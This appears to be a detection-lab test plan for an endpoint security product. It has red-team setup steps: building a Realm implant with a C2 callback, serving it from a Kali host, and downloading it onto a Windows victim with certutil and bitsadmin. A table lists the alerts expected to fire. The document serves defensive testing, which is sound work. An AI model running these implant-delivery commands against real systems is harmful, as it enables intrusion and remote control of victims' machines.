# Test: Delivery — signed LOLBIN downloaders (certutil / bitsadmin)

**Chain:** implant fetched by a signed Windows binary instead of PowerShell — no encoded
command, no script host. Tests the LOLBIN-fetch rules.

**Implant setup — creation to the Windows machine (do once before the test):**

**a) Kali, one-time tooling** (skip if already installed):
```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y && source ~/.cargo/env
rustup target add x86_64-pc-windows-gnu
sudo apt update && sudo apt install -y golang git
```

**b) Kali — clone Realm, build the implant (callback baked in), start the C2:**
```bash
git clone https://github.com/spellshift/realm.git ~/realm && cd ~/realm
git checkout -b latest $(git tag | tail -1)
go run ./tavern                 # terminal 1: Tavern C2 server - leave running

cd ~/realm/implants/imix        # terminal 2: build with YOUR Kali IP baked in
IMIX_CALLBACK_URI=http://172.16.69.109:8080 cargo build --release
mkdir -p ~/sideload-lab && cp target/release/imix.exe ~/sideload-lab/sysupd.exe
```

**c) Kali — serve the binaries:**
```bash
cd ~/sideload-lab && python3 -m http.server 8000
```

**d) Windows — put the implant on the machine + prep the EDR** (elevated PowerShell):
```powershell
Invoke-WebRequest http://172.16.69.109:8000/sysupd.exe -OutFile C:\Users\Public\sysupd.exe
# EDR running + fresh persistence baseline:
curl.exe -X POST http://127.0.0.1:8420/api/baseline
# console: http://127.0.0.1:8420 - alerts stream into the LIVE panel
```
These drops themselves should already fire `SIG-REALM-IMIX` / `SIG-RUST-IMPLANT`
(on-write scan) — delivery detection working before the test even starts.
Full reference: [`../_common/implant-build.md`](../_common/implant-build.md).


**Victim (elevated PowerShell):** `.\test.ps1 -Kali 172.16.69.109`, or by hand:

```powershell
certutil -urlcache -f http://172.16.69.109:8000/sysupd.exe C:\Users\Public\sysupd.exe
#   expect: PROC-LOLBIN-DOWNLOAD (high) + EVT-4688-TEMP-family on the launch
bitsadmin /transfer CCDCTest /download /priority high `
  http://172.16.69.109:8000/sysupd.exe C:\Users\Public\sysupd2.exe
#   expect: PROC-LOLBIN-DOWNLOAD (high); a queued job also trips PERS-BITS
```

**Expected alerts:**

| Rule | Sev | Trigger |
|---|---|---|
| `PROC-LOLBIN-DOWNLOAD` | high | certutil `-urlcache` / bitsadmin `/transfer` command line |
| `SIG-REALM-IMPLANT` etc. | crit/high | on-write scan of the downloaded exe |
| `EVT-4688-TEMP` + `PROG-IMPLANT-LAUNCH` | high/crit | when you launch it from \Users\Public |

**Cleanup:** `..\..\poc-scripts\victim\05-full-cleanup.ps1`
